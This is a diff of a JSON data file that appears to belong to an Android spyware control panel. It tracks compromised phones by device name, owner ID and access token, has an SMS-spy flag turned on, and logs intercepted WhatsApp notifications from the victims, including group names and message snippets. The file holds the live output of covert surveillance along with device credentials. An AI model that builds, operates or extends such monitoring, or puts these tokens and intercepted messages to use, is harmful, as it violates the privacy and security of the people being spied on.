@@ -4,7 +4,7 @@
     "deviceName": "HP-AIM-7C2F",
     "ownerUsername": "51a6566b-13c6-424c-8f68-421c28fdc099",
     "token": "5c459e8712f2a7ee2b4192ea89156763",
-    "lastSeen": 1775043503752,
+    "lastSeen": 1775043506750,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-01T10:32:40.020Z",
@@ -20,6 +20,22 @@
     "lastScreenFrame": null,
     "smsSpyActive": true,
     "smsMessages": [
+      {
+        "appName": "WhatsApp",
+        "sender": "WhatsApp",
+        "content": "‎‎15147 pesan dari 10 chat",
+        "time": "01/04 19:38",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1775043504939
+      },
+      {
+        "appName": "WhatsApp",
+        "sender": "‎main botwiee bersama (12867 pesan): ~ sʏʀɪɴɴ",
+        "content": "Obat jalan",
+        "time": "01/04 19:38",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1775043504859
+      },
       {
         "appName": "WhatsApp",
         "sender": "WhatsApp",
@@ -4003,22 +4019,6 @@
         "time": "01/04 19:29",
         "pkg": "com.whatsapp",
         "receivedAt": 1775042943205
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "WhatsApp",
-        "content": "‎‎14943 pesan dari 9 chat",
-        "time": "01/04 19:28",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1775042939248
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "‎main botwiee bersama (12689 pesan): ~ Bot",
-        "content": "💟 Stiker",
-        "time": "01/04 19:28",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1775042939236
       }
     ],
     "galleryPhotos": [],
@@ -4049,7 +4049,7 @@
     "deviceName": "HP-AIM-22BD",
     "ownerUsername": "51a6566b-13c6-424c-8f68-421c28fdc099",
     "token": "ee7716168abf03ae6470b12578967076",
-    "lastSeen": 1775043501954,
+    "lastSeen": 1775043507883,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-01T10:33:59.233Z",
@@ -4065,6 +4065,22 @@
     "lastScreenFrame": null,
     "smsSpyActive": true,
     "smsMessages": [
+      {
+        "appName": "WhatsApp",
+        "sender": "‎main botwiee bersama (12868 pesan): ~ 🕷️",
+        "content": "💟 Stiker",
+        "time": "01/04 19:38",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1775043508148
+      },
+      {
+        "appName": "WhatsApp",
+        "sender": "WhatsApp",
+        "content": "‎‎15147 pesan dari 10 chat",
+        "time": "01/04 19:38",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1775043504962
+      },
       {
         "appName": "WhatsApp",
         "sender": "‎main botwiee bersama (12867 pesan): ~ sʏʀɪɴɴ",
@@ -8048,22 +8064,6 @@
         "time": "01/04 19:29",
         "pkg": "com.whatsapp",
         "receivedAt": 1775042943427
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "‎LANGGANAN FT CEES 500P-5K BY WINZX [1] (90 pesan): ~ Dark Chocolate 🍫👅",
-        "content": "💟 Stiker",
-        "time": "01/04 19:29",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1775042943363
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "‎main botwiee bersama (12689 pesan): ~ Bot",
-        "content": "💟 Stiker",
-        "time": "01/04 19:28",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1775042940114
       }
     ],
     "galleryPhotos": [],
